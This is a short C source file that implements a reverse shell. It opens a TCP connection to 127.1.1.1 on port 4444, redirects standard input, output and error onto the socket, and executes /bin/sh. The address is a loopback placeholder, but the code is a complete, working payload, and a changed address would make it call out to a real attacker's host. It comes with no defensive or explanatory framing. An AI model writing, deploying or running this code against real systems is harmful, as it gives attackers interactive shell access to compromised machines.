#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

#define ADDR "127.1.1.1"
#define PORT 4444

int sock_fd;
struct sockaddr_in s_addr;

int main(int argc, char **argv) {
    // Create a TCP socket
    sock_fd = socket(AF_INET, SOCK_STREAM, 0);

    // Initialize sockaddr_in struct
    s_addr.sin_family = AF_INET;
    s_addr.sin_port = htons(PORT);
    s_addr.sin_addr.s_addr = inet_addr(ADDR);
     
    connect(sock_fd, (struct sockaddr *)&s_addr, sizeof(s_addr));
      
    // Duplicate stdin/out/err file descriptors
    for (int i = 2; i >= 0; i--) dup2(sock_fd, i);

    // Execute shell
    execl("/bin/sh", NULL, NULL);
    close(sock_fd);

    return 0;
}
